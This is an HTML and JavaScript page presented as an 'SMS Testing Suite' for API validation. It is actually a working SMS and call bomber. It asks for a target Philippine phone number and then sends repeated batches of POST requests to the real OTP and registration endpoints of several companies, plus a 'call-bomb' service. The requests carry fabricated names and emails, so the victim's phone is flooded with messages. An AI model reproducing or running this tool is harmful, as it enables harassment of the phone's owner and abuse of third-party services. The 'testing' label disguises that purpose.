<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Testing Suite</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #0f0f15;
            color: #d1d5db;
            min-height: 100vh;
        }
        .card {
            background: rgba(30, 41, 59, 0.6);
            border: 1px solid #374151;
            backdrop-filter: blur(10px);
        }
        .input-field {
            background: rgba(17, 24, 39, 0.8);
            border: 1px solid #4b5563;
            color: #e5e7eb;
        }
        .input-field:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }
        .btn-primary {
            background: #1e40af;
            color: white;
            transition: all 0.2s;
        }
        .btn-primary:hover {
            background: #1e3a8a;
        }
        .btn-danger {
            background: #dc2626;
            color: white;
        }
        .service-item {
            background: rgba(17, 24, 39, 0.8);
            border: 1px solid #374151;
            transition: all 0.2s;
            cursor: pointer;
        }
        .service-item.selected {
            background: rgba(30, 64, 175, 0.3);
            border-color: #3b82f6;
        }
        .progress-bar {
            background: rgba(17, 24, 39, 0.8);
            border: 1px solid #374151;
        }
        .progress-fill {
            background: #3b82f6;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body class="p-4 flex items-center justify-center">
    <div class="w-full max-w-2xl">
        <!-- Header -->
        <div class="card rounded-lg p-6 mb-6 text-center">
            <h1 class="text-2xl font-semibold text-gray-200 mb-2">SMS Testing Suite</h1>
            <p class="text-gray-400 text-sm">API endpoint validation tool</p>
        </div>

        <!-- Configuration -->
        <div class="card rounded-lg p-6 mb-6">
            <h2 class="text-lg font-medium text-gray-200 mb-4">Test Configuration</h2>
            
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Phone Number</label>
                    <input 
                        type="text" 
                        id="target-number" 
                        placeholder="09XXXXXXXXX"
                        class="input-field w-full p-3 rounded text-sm"
                    >
                </div>
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Test Iterations</label>
                    <input 
                        type="number" 
                        id="batch-amount" 
                        value="3"
                        min="1"
                        max="10"
                        class="input-field w-full p-3 rounded text-sm"
                    >
                </div>
            </div>

            <!-- Service Selection -->
            <div class="mb-4">
                <label class="block text-gray-300 text-sm mb-2">API Endpoints</label>
                <div id="service-list" class="grid grid-cols-2 gap-2 max-h-32 overflow-y-auto p-3 card rounded">
                    <!-- Services load here -->
                </div>
            </div>

            <button onclick="startTest()" id="start-button" class="btn-primary w-full p-3 rounded text-sm font-medium">
                Start API Testing
            </button>
        </div>

        <!-- Progress -->
        <div id="test-progress" class="card rounded-lg p-6 mb-6 hidden">
            <h2 class="text-lg font-medium text-gray-200 mb-4">Test Progress</h2>
            
            <div class="mb-4">
                <div class="flex justify-between text-gray-300 text-sm mb-2">
                    <span>Completion</span>
                    <span id="progress-text">0%</span>
                </div>
                <div class="progress-bar h-2 rounded">
                    <div id="progress-fill" class="progress-fill h-2 rounded" style="width: 0%"></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 text-center mb-4">
                <div class="card p-3">
                    <div class="text-blue-400 font-medium" id="success-count">0</div>
                    <div class="text-gray-400 text-xs">Successful</div>
                </div>
                <div class="card p-3">
                    <div class="text-red-400 font-medium" id="fail-count">0</div>
                    <div class="text-gray-400 text-xs">Failed</div>
                </div>
            </div>

            <div class="text-center">
                <div id="current-batch" class="text-gray-400 text-sm mb-3">Initializing...</div>
                <button onclick="stopTest()" class="btn-danger w-full p-2 rounded text-sm">
                    Stop Testing
                </button>
            </div>
        </div>

        <!-- Results -->
        <div id="test-results" class="card rounded-lg p-6 mb-6 hidden">
            <h2 class="text-lg font-medium text-gray-200 mb-4">Test Results</h2>
            <div class="text-center">
                <div class="text-2xl font-medium text-gray-200 mb-2" id="total-requests">0</div>
                <div class="text-gray-400 text-sm mb-4">Total API Calls</div>
                <div class="text-sm">
                    <span class="text-blue-400">✓ <span id="result-success">0</span> successful</span> | 
                    <span class="text-red-400">✗ <span id="result-fail">0</span> failed</span>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center text-gray-500 text-xs">
            @dndvcx • API Testing Tool
        </div>
    </div>

    <script>
        const API_ENDPOINTS_MAP = {
            "XPRESS": "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
            "ABENSON": "https://api.mobile.abenson.com/api/public/membership/activate_otp",
            "FORTUNE_PAY": "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
            "LBC": "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
            "PICKUP_COFFEE": "https://production.api.pickup-coffee.net/v2/customers/login",
            "HONEY_LOAN": "https://api.honeyloan.ph/api/client/registration/step-one",
            "KOMO_PH": "https://api.komo.ph/api/otp/v5/generate",
            "CALL_BOMB": "https://call-bomb.onrender.com/",
        };

        let selectedServices = Object.keys(API_ENDPOINTS_MAP);
        let isTesting = false;
        let testStats = { success: 0, failed: 0 };

        function renderServices() {
            const serviceList = document.getElementById('service-list');
            serviceList.innerHTML = '';
            
            Object.keys(API_ENDPOINTS_MAP).forEach(service => {
                const isSelected = selectedServices.includes(service);
                const serviceItem = document.createElement('div');
                serviceItem.className = `service-item p-2 rounded cursor-pointer text-xs ${isSelected ? 'selected' : ''}`;
                serviceItem.textContent = service.replace(/_/g, ' ');
                serviceItem.onclick = () => toggleService(service);
                serviceList.appendChild(serviceItem);
            });
        }

        function toggleService(service) {
            const index = selectedServices.indexOf(service);
            if (index > -1) {
                selectedServices.splice(index, 1);
            } else {
                selectedServices.push(service);
            }
            renderServices();
        }

        function normalizePhoneNumber(phone) {
            phone = phone.trim().replace(/[^0-9+]/g, '');
            if (phone.startsWith('+639') && phone.length === 13) return phone;
            if (phone.startsWith('639') && phone.length === 12) return '+' + phone;
            if (phone.startsWith('09') && phone.length === 11) return '+63' + phone.substring(1);
            if (phone.startsWith('9') && phone.length === 10) return '+63' + phone;
            return null;
        }

        function randomString(length) {
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        async function makeApiRequest(service, phoneNumber) {
            const url = API_ENDPOINTS_MAP[service];
            const normalizedPhone = normalizePhoneNumber(phoneNumber);
            
            if (!normalizedPhone) return false;

            try {
                const options = {
                    method: 'POST',
                    signal: AbortSignal.timeout(8000),
                    headers: {}
                };

                switch(service) {
                    case "XPRESS":
                        options.headers = { 'Content-Type': 'application/json' };
                        options.body = JSON.stringify({
                            FirstName: "Test",
                            LastName: "User",
                            Email: `test${randomString(8)}@gmail.com`,
                            Phone: normalizedPhone,
                            Password: "Password123"
                        });
                        break;
                    case "ABENSON":
                        options.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
                        options.body = `contact_no=${normalizedPhone.replace('+63', '')}`;
                        break;
                    case "CALL_BOMB":
                        options.headers = { 'Content-Type': 'application/json' };
                        options.body = JSON.stringify({ phone: normalizedPhone });
                        break;
                    default:
                        options.headers = { 'Content-Type': 'application/json' };
                        options.body = JSON.stringify({ phone: normalizedPhone });
                }

                const response = await fetch(url, options);
                return response.status >= 200 && response.status < 300;
                
            } catch (error) {
                return false;
            }
        }

        async function startTest() {
            if (isTesting) return;
            
            const target = document.getElementById('target-number').value.trim();
            const batches = parseInt(document.getElementById('batch-amount').value);
            
            if (!target) {
                alert('Please enter a phone number');
                return;
            }
            
            if (selectedServices.length === 0) {
                alert('Please select at least one API endpoint');
                return;
            }

            const normalizedPhone = normalizePhoneNumber(target);
            if (!normalizedPhone) {
                alert('Invalid phone number format');
                return;
            }

            isTesting = true;
            testStats = { success: 0, failed: 0 };
            
            document.getElementById('test-progress').classList.remove('hidden');
            document.getElementById('test-results').classList.add('hidden');
            document.getElementById('start-button').disabled = true;
            
            updateProgress(0, batches);
            
            for (let i = 1; i <= batches && isTesting; i++) {
                document.getElementById('current-batch').textContent = `Batch ${i} of ${batches}`;
                
                const requests = selectedServices.map(service => 
                    makeApiRequest(service, target)
                );
                
                const results = await Promise.all(requests);
                
                results.forEach(success => {
                    if (success) {
                        testStats.success++;
                    } else {
                        testStats.failed++;
                    }
                });
                
                updateProgress(i, batches);
                
                if (i < batches && isTesting) {
                    await new Promise(resolve => setTimeout(resolve, 1500));
                }
            }
            
            isTesting = false;
            document.getElementById('test-progress').classList.add('hidden');
            document.getElementById('test-results').classList.remove('hidden');
            document.getElementById('start-button').disabled = false;
            
            document.getElementById('total-requests').textContent = testStats.success + testStats.failed;
            document.getElementById('result-success').textContent = testStats.success;
            document.getElementById('result-fail').textContent = testStats.failed;
        }

        function stopTest() {
            isTesting = false;
            document.getElementById('test-progress').classList.add('hidden');
            document.getElementById('start-button').disabled = false;
        }

        function updateProgress(current, total) {
            const percent = (current / total) * 100;
            document.getElementById('progress-text').textContent = `${Math.round(percent)}%`;
            document.getElementById('progress-fill').style.width = `${percent}%`;
            document.getElementById('success-count').textContent = testStats.success;
            document.getElementById('fail-count').textContent = testStats.failed;
        }

        document.addEventListener('DOMContentLoaded', function() {
            renderServices();
        });
    </script>
</body>
</html>
